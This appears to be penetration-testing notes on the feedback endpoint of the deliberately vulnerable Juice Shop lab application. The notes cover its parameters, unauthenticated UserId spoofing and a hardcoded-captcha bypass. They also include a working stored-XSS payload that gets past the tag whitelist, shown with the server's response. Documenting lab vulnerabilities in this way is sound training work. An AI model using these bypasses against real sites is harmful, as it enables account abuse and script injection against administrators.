## Description

Endpoint stores and displays customer feedback for juice shops.

## Connection Details

HTTP Methods: `GET,POST`
GET Parameters:
- `UserId`
- `id`
- `rating`
- `createdAt`
- `updatedAt`
- `comment`
POST Parameters: 
- `captchaId`
- `captcha`
- `comment`
- `rating`
- `UserId`
- `id`

### Sample Request
Request:
```HTTP
POST /api/Feedbacks/ HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
Content-Type: application/json
Content-Length: 90

{"captchaId":2,"captcha":"6","comment":"*","rating":"*","UserId":"1"}
```

Response: 
```http
HTTP/1.1 201 Created
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Location: /api/Feedbacks/281
Content-Type: application/json; charset=utf-8
Content-Length: 154
ETag: W/"9a-KDEvG9n2O9diJshsCVoWFL2YP1E"
Vary: Accept-Encoding
Date: Tue, 20 Dec 2022 08:51:44 GMT
Connection: close

{"status":"success","data":{"id":281,"comment":"*","rating":"*","UserId":1,"updatedAt":"2022-12-20T08:51:44.603Z","createdAt":"2022-12-20T08:51:44.603Z"}}
```


## Parameters 

### `UserId`

#### Description

Set the `UserId` of a feedback entry. No validation or verification performed, but `UserId` required to be valid for an entry to be registered. Invalid `UserId` fails due to SQL Foreign Key constraint on the field. 

### `Comment`

#### Description

Contents are displayed at `/#/administration`, only accessible by an admin of the application. There seems to be a whitelist filter that only allows the following tags:
- `blockquote`
- `caption`
- `strike`
- `strong`
- `table`
- `tbody`
- `thread`
- `code`
- `div`
- `pre`
- `em`
- `a`
- `b`
- `i`
- `p`
- `br`
- `hr`
Injection point for stored XSS.



## Vulnerabilities

### Lack of Authentication (UserId)

#### Description
Unauthenticated user can submit feedback on behalf of any user. 

### Captcha bypass

#### Description
Captcha answers are hardcoded and answers can be pre-calculated. For instance, the answer to captcha with `captchaId: 2` is `6`. 

### Stored XSS in comment field
 
#### Exploit
```json
{
	"UserId":9,
	"captchaId":9,
	"captcha":"13",
	"comment":"<<i<>img src=x onerror=alert(1)>",
	"rating":2
}
```

Results in 
```json
{
	"status":"success",
	"data":{
		"id":527,
		"UserId":9,
		"comment":"<img src=x onerror=alert(1)>",
		"rating":2,
		"updatedAt":"2022-12-21T07:40:49.831Z",
		"createdAt":"2022-12-21T07:40:49.831Z"
	}
}
```

#### Impact
Stored XSS on admin user. 


## Possible Attack Vectors

### 


